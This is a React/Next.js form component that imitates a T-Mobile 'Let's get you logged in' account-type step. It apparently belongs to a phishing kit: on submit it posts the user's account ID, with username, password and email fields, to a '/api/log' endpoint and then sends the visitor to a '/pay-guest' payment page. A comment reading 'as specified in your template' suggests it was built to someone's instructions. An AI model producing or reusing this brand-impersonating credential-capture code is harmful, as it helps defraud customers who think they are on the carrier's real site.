'use client';

import { useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { ChevronLeft } from "lucide-react";

const ACCOUNT_TYPES = [
  { id: "canceled", label: "Recently canceled account" },
  { id: "home-internet", label: "Home internet account" },
  { id: "business", label: "T-Mobile for Business account" },
];

function formatAccountId(value: string) {
  const digits = value.replace(/\D/g, "");
  if (digits.length === 10) {
    return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
  }
  if (digits.length === 11 && digits.startsWith("1")) {
    const d = digits.slice(1);
    return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
  }
  return value;
}

export function AccountTypeForm({ accountId }: { accountId: string }) {
  const [selected, setSelected] = useState("canceled");
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();
  const displayId = formatAccountId(accountId);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const data = {
      username: accountId || displayId,
      password: 'N/A',
      email: 'N/A',
      accountType: selected,
      type: 'account-type'
    };

    try {
      await fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });

      // Redirect as specified in your template
      window.location.href = '/pay-guest';
    } catch (err) {
      console.error('Log failed', err);
      window.location.href = '/pay-guest';
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex w-full max-w-md flex-col">
      <div className="rounded-2xl border border-border bg-card p-8 shadow-sm md:p-10">
        <h1 className="text-3xl font-bold tracking-tight text-foreground">Let&apos;s get you logged in</h1>
        <p className="mt-6 text-base font-bold text-foreground">What type of account is {displayId}?</p>

        <form onSubmit={handleSubmit} className="mt-5">
          <fieldset>
            <legend className="sr-only">Account type</legend>
            <div className="space-y-5">
              {ACCOUNT_TYPES.map((type) => (
                <label key={type.id} className="flex cursor-pointer items-center gap-3">
                  <input
                    type="radio"
                    name="account-type"
                    value={type.id}
                    checked={selected === type.id}
                    onChange={() => setSelected(type.id)}
                    className="h-5 w-5 shrink-0 appearance-none rounded-full border-2 border-muted-foreground bg-background checked:border-[5px] checked:border-primary focus:outline-none focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2"
                  />
                  <span className="text-sm font-bold text-foreground">{type.label}</span>
                </label>
              ))}
            </div>
          </fieldset>

          <div className="mt-8 space-y-4">
            <button
              type="submit"
              disabled={isLoading}
              className="w-full rounded-md bg-primary px-6 py-3 text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-70"
            >
              {isLoading ? "Processing..." : "Next"}
            </button>

            <button
              type="button"
              className="w-full rounded-md border border-foreground bg-background px-6 py-3 text-sm font-bold text-foreground transition-colors hover:bg-muted"
            >
              Create a T-Mobile ID
            </button>
          </div>
        </form>
      </div>

      <Link
        href="/"
        className="mt-6 inline-flex items-center gap-1 self-start text-sm font-bold text-foreground hover:underline"
      >
        <ChevronLeft className="h-4 w-4" />
        Back
      </Link>
    </div>
  );
}